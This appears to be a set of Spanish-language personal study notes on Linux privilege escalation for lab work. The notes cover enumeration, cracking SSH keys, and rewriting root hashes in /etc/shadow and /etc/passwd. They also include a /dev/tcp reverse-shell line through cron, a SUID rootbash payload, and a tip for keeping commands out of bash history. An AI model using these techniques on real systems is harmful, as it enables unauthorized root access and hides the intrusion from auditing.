
## <font color="#245bdb">TOOLS</font>
- linenum
- lse.sh
- linpeas

## <font color="#245bdb">ESTRUCTURA</font>
- env --> Variables de entorno
- dev/ --> Archivos de dispositivo
- etc/ --> Archivos de configuración default
- usr/ --> Binarios de usuario y datos de programa
- home/ --> Cosas personales del usuario
- lib/ --> Bibliotecas compartidas
- sbin/ --> Binarios del sistema
- tmp/ --> Archivos temporales
- var/ --> Archivos de variables de datos
- boot/ --> Archivos de arranque
- proc/ -->Archivos del proceso y del núcleo
- opt/ --> Software opcional
- root/ --> Directorio principal de la raíz
- media/ --> Puntos de montaje
- mnt/ --> Montar directorios
- srv/ --> Datos de servicio

## <font color="#245bdb">INFORMACIÓN DEL USUARIO</font>
- id
- env
- whoami
- ls -la
- bash_history


## <font color="#245bdb">PROCESOS</font>
- ps
- man ps
- top
- htop
 
```
ps aux | grep “^root”
```
Procesos que corren como root



## <font color="#245bdb">REDES</font>
- ip addr
- ip route
- ifconfig
- netstat


## <font color="#245bdb">TAREAS PROGRAMADAS</font>
crontab -l
ls /etc/cron
ls /etc/crontab


## <font color="#245bdb">SUDO</font>
cat /etc/sudoers --> Archivo en el que permite que correr y con que privilegios
cat /etc/passwd
cat /etc/shadow --> Se encuentran los hashes de los usuarios
sudo -l 
sudo -s --> Ejecutar una shell
sudo -u --> Cambiar de usuario


## <font color="#245bdb">SSH</font>
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null


## <font color="#245bdb">TRANSFERENCIA DE ARCHIVOS</font>

```
wget http://ip/archivo
```


```
scp -o HostKeyALgorithms=+ssh-rsa 39535.sh user@192.168.35.129:/home/user/Desktop
```
Archivos sueltos a máquina víctima


```
scp -r -O -o HostKeyAlgorithms=+ssh-rsa CVE-2021-4034-main/ user@192.168.35.129:/home/user/Desktop
```
Directorios a máquina víctima

https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics


## <font color="#245bdb">CAMBIAR USUARIO</font>

```
sudo -u usuario /bin/bash
```


## <font color="#245bdb">CAMBIAR CONTRASEÑA ROOT</font>

### <font color="#00b050">SHADOW</font>
![[Pasted image 20260121171951.png]]

```
mkpasswd -m sha-512 test
```

```
vim /etc/shadow
```

wq!

### <font color="#00b050">PASSWD</font>
```
openssl passwd "test"
```

copiar lo que salga
/etc/passwd --> Sustitur la X de root por lo que haya salido


## <font color="#245bdb">CRACKEAR SSH</font>
### <font color="#00b050">SIN PARAPHRASE</font>
cd .ssh
ls
cat

crear archivo con la la clave y guardar

![[Pasted image 20260121172541.png]]


### <font color="#ff0000">CON PARAPHRASE</font>
![[Pasted image 20260121172800.png]]

![[Pasted image 20260121173059.png]]

![[Pasted image 20260121174244.png]]


## <font color="#245bdb">CRONTAB MODIFICAR TAREAS PROGRAMADAS</font>
cd /etc
ls  | grep cron

cat crontab
añadir shell, archivo o lo que sea


Se puede crear una tarea con el mismo nombre en una ruta antes en el path para que se ejecute ese
![[Pasted image 20260122172711.png]]

![[Pasted image 20260122173006.png]]



## <font color="#245bdb">PORT FORWARDING</font>

![[Pasted image 20260123190318.png]]



## <font color="#245bdb">REV SHELL CRONTAB</font>

```
!/bin/bash  
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```


## <font color="#245bdb">SHELL INTERNA EN CRONTAB</font>
Crear un archivo con el mismo nombre que la tarea en home

```
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```


Dar permisos al archivo
```
chmod +x /home/user/overwrite.sh
```


Iniciar sesión root
```
/tmp/rootbash -p
```





Si pones un espacio antes de un comando no sale en el bash history
https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics

KERNEL --> Encargado de las funciones core
uname -a --> Enumerar el sistema
dmesg --> Cargador de arranque (logs)

Movimiento horizontal --> Mismos privilegios
Vertical --> Cada vez más privilegios